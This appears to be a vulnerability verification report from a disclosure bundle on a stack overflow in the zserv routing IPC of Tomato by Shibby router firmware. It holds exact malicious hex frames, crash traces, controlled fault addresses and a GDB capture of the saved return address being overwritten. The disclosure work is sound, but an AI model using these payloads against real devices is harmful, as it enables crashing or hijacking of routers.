# Dynamic Verification

Validation scope:

- vendor / product line: `Tomato by Shibby`
- verified version line: `Tomato v1.28.0005 124 ND USB`
- verified official package family:
  - `tomato-NDUSB-1.28.5x-124-Nocat-VPN.trx`
  - `tomato-NDUSB-1.28.5x-124-BT-VPN.trx`
- execution method: `unshare -Urnm` + `qemu-mipsel -L <matching extracted rootfs>`
- PoC transport: fake Unix domain socket server for `/tmp/.zserv`

Observed zserv behavior:

- `ripd` connects to `/tmp/.zserv`
- `ripd` sends a startup frame `000301`
- a minimal benign route-add frame is accepted through the same path:
  - `000a07010000180a0000`

Confirmed malicious frame shape:

- `002707010000ff4141...4141`
- `002707010000ff4242...4242`

Interpretation:

- `00 27`: total zserv frame length `39`
- `07`: `ZEBRA_IPV4_ROUTE_ADD`
- `01`: route type
- `00`: unused byte
- `00`: message flags
- `ff`: `plen = 255`
- trailing `41` / `42`: attacker-controlled prefix payload bytes

Crash evidence:

1. Fill pattern `0x41`
   - fake server sent:
     - `002707010000ff4141414141414141414141414141414141414141414141414141414141414141`
   - `ripd` then crashed immediately after:
     - `read(8, ..., 3) = 3`
     - `read(8, ..., 36) = 36`
   - signal:
     - `SIGSEGV`
   - fault address:
     - `0x41414140`

2. Fill pattern `0x42`
   - fake server sent:
     - `002707010000ff4242424242424242424242424242424242424242424242424242424242424242`
   - `ripd` again crashed immediately after:
     - `read(8, ..., 3) = 3`
     - `read(8, ..., 36) = 36`
   - signal:
     - `SIGSEGV`
   - fault address:
     - `0x42424242`

GDB capture:

- a dedicated `qemu-mipsel -g 1234` run with breakpoints at `0x40cb88` and `0x40cb90` captured the stack immediately before and after the vulnerable `stream_get`
- before the copy:
  - `sp = 0x2b2aafb0`
  - `ra = 0x40cb70`
  - stack bytes at `sp+0x30` still contain normal local values
- after the copy with `plen=255` and fill byte `0x44`:
  - `sp = 0x2b2aafb0`
  - `ra = 0x40cb90`
  - bytes at `sp+0x30 .. sp+0x4f` become a contiguous `0x44` pattern
  - saved register words at `sp+0x38` become `0x44444444`
  - saved return address word at `sp+0x4c` becomes `0x44444444`

This is the strongest runtime proof in the bundle because it shows the overwrite directly before the function returns.

Threshold probes:

- `plen = 64`
  - no immediate crash within the short probe window
- `plen = 65`
  - no immediate crash within the short probe window
- `plen = 224`
  - abnormal exit with `SIGBUS`
  - fault address observed as `0x43434343`
- `plen = 225`
  - `SIGSEGV`
  - fault address observed as `0x00000032`
- `plen = 255`
  - `SIGSEGV`
  - controlled fault addresses `0x41414140`, `0x42424242`

Attack surface observations:

- the paired `zebra` process in the validation environment ran as `uid=0 gid=0`
- `/tmp/.zserv` appeared as `0:0 0700`
- the captured ownership / mode data is bundled in `runtime_socket_mode.txt`
- this supports a `local privileged / same-host IPC boundary` attack surface, not a remote network claim
- separate product-line static evidence suggests that authenticated administrative interfaces can indirectly influence the same routing control plane; see `admin_plane_bridge.md`

Current evidentiary value:

- the runtime evidence confirms that the static `plen -> ceil(plen/8) -> stack overwrite` model is real
- controlled crash addresses show attacker bytes influence post-copy control data
- the GDB transcript directly shows saved stack state, including `saved_ra_word=0x44444444`
- the current bundle is sufficient to support a conservative `local privileged / same-host IPC boundary` submission without making remote or low-privilege claims
